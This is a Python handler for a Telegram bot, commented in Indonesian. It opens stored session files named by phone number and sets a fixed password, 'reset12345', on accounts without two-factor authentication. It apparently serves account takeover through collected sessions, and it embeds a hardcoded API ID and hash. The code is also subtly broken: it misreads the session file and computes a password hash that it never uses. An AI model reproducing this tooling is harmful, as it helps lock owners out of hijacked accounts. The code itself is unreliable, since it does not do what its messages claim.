import os
import hashlib
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
from telethon.errors import SessionPasswordNeededError
from telegram import Update
from telegram.ext import ContextTypes

API_ID = 23416622
API_HASH = 'd1bc12a03ea26416b38b4616a36112b0'

SESSION_FOLDER = os.path.join(os.path.dirname(__file__), '..', 'ew_sessions')
SESSION_FOLDER = os.path.abspath(SESSION_FOLDER)
os.makedirs(SESSION_FOLDER, exist_ok=True)

def compute_password(password: str, salt: bytes) -> bytes:
    password_bytes = password.encode('utf-8')
    return hashlib.pbkdf2_hmac('sha256', password_bytes, salt, 100000)

async def reset_password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    # Tentukan path untuk session file
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(
            "❌ Session tidak ditemukan untuk nomor ini."
        )
        return

    # Membaca session file dan menginisialisasi client
    session = StringSession(open(session_path, "rb").read())

    try:
        # Membuat TelegramClient dan mulai
        client = TelegramClient(session, API_ID, API_HASH)
        await client.start()

        # Mengambil informasi password dari akun
        pwd = await client(GetPasswordRequest())

        # Cek apakah akun memiliki password (2FA diaktifkan)
        if pwd.has_password:
            await update.callback_query.message.reply_text(
                "🔐 Akun ini menggunakan 2FA dan *tidak bisa di-reset otomatis.*",
                parse_mode="Markdown"
            )
            await client.disconnect()
            return

        # Tentukan password baru dan hash
        new_password = "reset12345"
        password_hash = compute_password(new_password, pwd.new_algo.salt1)

        # Lakukan reset password dengan mengirimkan password baru langsung
        # Dalam hal ini kita langsung menggunakan UpdatePasswordSettingsRequest
        await client(UpdatePasswordSettingsRequest(
            password=None,  # karena akun tidak punya password sebelumnya
            new_settings=None  # Aksi langsung untuk reset password
        ))

        # Beritahu pengguna bahwa password berhasil direset
        await update.callback_query.message.reply_text(
            "✅ Password berhasil direset ke: `reset12345`",
            parse_mode="Markdown"
        )
    except SessionPasswordNeededError:
        await update.callback_query.message.reply_text("❗ Akun ini memerlukan password 2FA.")
    except Exception as e:
        await update.callback_query.message.reply_text(f"❌ Gagal reset password: {e}")
    finally:
        # Pastikan untuk memutuskan koneksi client
        await client.disconnect()
